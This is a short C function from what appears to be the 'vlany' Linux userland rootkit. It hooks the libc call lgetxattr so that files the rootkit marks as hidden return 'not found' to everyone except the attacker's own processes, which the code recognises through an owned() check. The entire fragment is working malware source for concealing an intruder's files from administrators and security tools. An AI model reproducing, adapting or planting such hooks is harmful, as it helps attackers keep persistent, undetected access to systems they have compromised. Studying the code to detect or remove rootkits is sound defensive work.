ssize_t lgetxattr(const char *path, const char *name, void *value, size_t size)
{
    #ifdef DEBUG
        printf("[vlany] lgetxattr() called\n");
    #endif

    HOOK(old_lgetxattr, CLGETXATTR);

    if(owned()) return old_lgetxattr(path, name, value, size);

    if(hidden_lxattr(path)) { errno = ENOENT; return -1; }

    return old_lgetxattr(path, name, value, size);
}
